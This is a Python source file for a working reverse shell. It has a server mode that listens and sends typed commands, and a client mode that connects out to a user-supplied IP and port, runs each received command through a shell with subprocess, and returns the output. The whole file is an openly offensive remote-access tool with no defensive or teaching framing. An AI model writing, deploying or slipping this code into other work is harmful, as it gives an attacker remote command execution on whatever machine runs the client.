import socket
import subprocess
import re

class ReverseShell:
    def __init__(self, mode, ip, port):
        """
        Initialize the ReverseShell class with necessary parameters.
        :param mode: Mode of operation ('server' or 'client').
        :param ip: IP address to connect to or listen on.
        :param port: Port to connect to or listen on.
        """
        if not self.validate_ip(ip):
            raise ValueError(f"Invalid IP address: {ip}")
        if not self.validate_port(port):
            raise ValueError(f"Invalid port number: {port}")

        self.mode = mode
        self.ip = ip
        self.port = int(port)

    def validate_ip(self, ip):
        """
        Validate the IP address.
        :param ip: The IP address to validate.
        :return: True if valid, False otherwise.
        """
        ip_regex = re.compile(
            r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
        )
        return ip_regex.match(ip) is not None

    def validate_port(self, port):
        """
        Validate the port number.
        :param port: The port number to validate.
        :return: True if valid, False otherwise.
        """
        return 0 < int(port) < 65536

    def run_server(self):
        """
        Run the reverse shell server.
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.bind((self.ip, self.port))
                server_socket.listen(1)
                print(f"[*] Listening on {self.ip}:{self.port}...")

                conn, addr = server_socket.accept()
                print(f"[+] Connection established from {addr}")

                while True:
                    command = input("Shell> ")
                    if command.lower() in ['exit', 'quit']:
                        print("[*] Closing connection...")
                        break

                    if command.strip():
                        conn.send(command.encode())
                        response = conn.recv(4096).decode()
                        print(response)

        except Exception as e:
            print(f"[-] Server error: {e}")

    def run_client(self):
        """
        Run the reverse shell client.
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((self.ip, self.port))
                print(f"[*] Connected to {self.ip}:{self.port}")

                while True:
                    command = client_socket.recv(4096).decode()
                    if command.lower() in ['exit', 'quit']:
                        print("[*] Closing connection...")
                        break

                    if command.strip():
                        try:
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                            client_socket.send(output)
                        except subprocess.CalledProcessError as e:
                            client_socket.send(str(e).encode())

        except Exception as e:
            print(f"[-] Client error: {e}")

    def run(self):
        """
        Run the reverse shell based on the selected mode.
        """
        if self.mode == 'server':
            self.run_server()
        elif self.mode == 'client':
            self.run_client()
        else:
            print(f"[-] Invalid mode: {self.mode}")


class ReverseShellRunner:
    def __init__(self):
        """
        Initialize the ReverseShellRunner class to handle user input and run the ReverseShell.
        """
        self.mode = None
        self.ip = None
        self.port = None

    def get_user_input(self):
        """Prompt user for necessary inputs to set up the reverse shell."""
        self.mode = input("Enter mode ('server' or 'client'): ").strip().lower()
        self.ip = input("Enter IP address: ").strip()
        self.port = input("Enter port number: ").strip()

    def run(self):
        """Run the ReverseShell based on user inputs."""
        try:
            self.get_user_input()
            reverse_shell = ReverseShell(self.mode, self.ip, self.port)
            reverse_shell.run()
        except ValueError as e:
            print(e)
